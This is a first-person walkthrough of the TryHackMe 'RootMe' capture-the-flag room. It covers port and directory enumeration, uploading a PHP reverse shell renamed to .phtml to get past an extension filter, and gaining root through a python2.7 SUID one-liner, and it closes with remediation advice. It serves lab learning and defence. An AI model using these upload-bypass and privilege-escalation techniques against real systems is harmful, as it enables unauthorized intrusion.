# Target: RootMe

**Platform:** TryHackMe
[RootMe on TryHackMe](https://tryhackme.com/room/rootme)

| Target Name | IP Address | OS | Difficulty |
| --- | --- | --- | --- |
| RootMe | 10.65.184.24 | Linux | Easy |

---

## Phase 1: Reconnaissance & Enumeration

First, I wanted to check how many ports were open on this machine, so I ran an Nmap scan to gather information:

**Nmap Scan:**

```bash
nmap -sV -p- -vv 10.65.184.24

```

```text
Completed NSE at 12:43, 0.43s elapsed
Nmap scan report for 10.64.167.153
Host is up, received reset ttl 62 (0.11s latency).
Scanned at 2026-02-06 12:41:59 CET for 70s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The scan revealed two open ports: port 22 running an SSH service, and port 80 running Apache version 2.4.41. Since port 80 was open, I knew the machine hosted a website, so I navigated to the IP address in my browser. The website only showed two lines of text: `root@rootme:~#` and `Can you root me?`.

I inspected the page source but found no hidden information. To uncover hidden directories, I used the `gobuster` tool:

**Directory Brute-forcing:**

```bash
gobuster dir -u http://10.65.184.24/ -w /usr/share/wordlists/dirb/common.txt

```

```text
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.65.184.24/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 309] [--> http://10.65.184.24/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.65.184.24/panel/]
/server-status        (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314] [--> http://10.65.184.24/uploads/]

```

The `/panel` directory looked interesting. When I accessed it, I found a page that allowed file uploads.

## Phase 2: Initial Foothold (Gaining Access)

I configured a PHP reverse shell script and set up Netcat to listen for incoming connections. When I tried to upload the file, the page blocked it and displayed a message stating that PHP is not allowed.

To bypass this filter, I renamed the file from `php-reverse-shell.php` to `php-reverse-shell.phtml`. After this change, the server accepted the file. I executed the payload by clicking "Veja!" on the page, which successfully gave me a reverse shell connection to the server.

**Local Enumeration (Finding the User Flag):**
Once I had a shell, my first goal was to locate the `user.txt` file. I used the `find` command, appending `2>/dev/null` to hide permission errors and keep the output clean:

```bash
find / -name user.txt 2>/dev/null

```

```text
/var/www/user.txt

```

I read the file using the `cat` command to retrieve the user flag:

```bash
cat /var/www/user.txt

```

```text
THM{y0u_g0t_a_sh3ll}

```

## Phase 3: Privilege Escalation & Post-Exploitation

Next, I needed to escalate my privileges to root. I started by searching for files with SUID permissions enabled using the `find` command:

**Searching for SUID Binaries:**

```bash
find / -type f -user root -perm -4000 2>/dev/null

```

The scan returned several files, but `/usr/bin/python2.7` immediately stood out as interesting. I searched GTFOBins for Python SUID exploits and found a one-liner to spawn a privileged shell.

**Exploiting Python SUID:**

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

```

Immediately after running this, I checked my current user with the `whoami` command, which confirmed I had become `root`.

**Finding the Root Flag:**
As before, I used the `find` command to locate the `root.txt` file:

```bash
find / -name root.txt 2>/dev/null

```

```text
/root/root.txt

```

I read the file to get the final flag:

```bash
cat /root/root.txt

```

```text
THM{pr1v1l3g3_3sc4l4t10n}

```

## Conclusion & Takeaways

**Summary:** Compromising the RootMe machine involved enumerating hidden web directories to discover a file upload panel. After bypassing a weak extension filter by changing a reverse shell payload from `.php` to `.phtml`, an initial foothold was established. Privilege escalation was achieved by identifying that the Python binary had an SUID bit set, which was trivially exploited to spawn a root shell.

**What I Learned:** * **Extension Bypassing:** How to bypass basic file upload restrictions by using alternative valid extensions for server-side scripts (like `.phtml` instead of `.php`).

* **SUID Enumeration & Exploitation:** How to locate misconfigured SUID binaries and leverage resources like GTFOBins to escalate privileges.

**Remediation:**
To secure this server and prevent similar attacks, I recommend the following remediations:

1. **Implement Secure File Upload Validation:** Relying on simple extension blocklists (e.g., blocking only `.php`) is insecure. The server should use a strict allowlist of permitted extensions (like `.jpg` or `.png`), validate the file's content/MIME type, and store uploaded files in a directory where script execution is disabled.
2. **Remove Unnecessary SUID Permissions:** The `python2.7` binary had the SUID bit set, allowing any user to execute Python commands as root. System administrators should regularly audit files with SUID/SGID permissions and immediately remove the SUID bit from interpreters and other non-essential binaries using the command `chmod -s /usr/bin/python2.7`.
